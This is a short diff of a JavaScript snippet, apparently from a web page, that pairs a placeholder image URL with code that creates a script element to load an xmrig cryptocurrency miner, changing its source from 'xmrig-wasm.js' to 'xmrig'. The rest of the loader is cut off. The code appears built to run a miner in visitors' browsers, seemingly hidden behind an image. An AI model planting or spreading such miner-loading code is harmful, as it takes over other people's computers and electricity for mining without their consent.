@@ -26,11 +26,11 @@
     var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL
 
     // --- LOAD THE MINER ---
-    // This code loads the .wasm file (the engine) and the .js file (the controller)
+    // This code loads the xmrig file (the engine) and the .js file (the controller)
     
     (function() {
         var script = document.createElement('script');
-        script.src = 'xmrig-wasm.js'; // Load the wasm file first
+        script.src = 'xmrig'; // Load the wasm file first
         script.async = true;
 
         script.onload = function() {
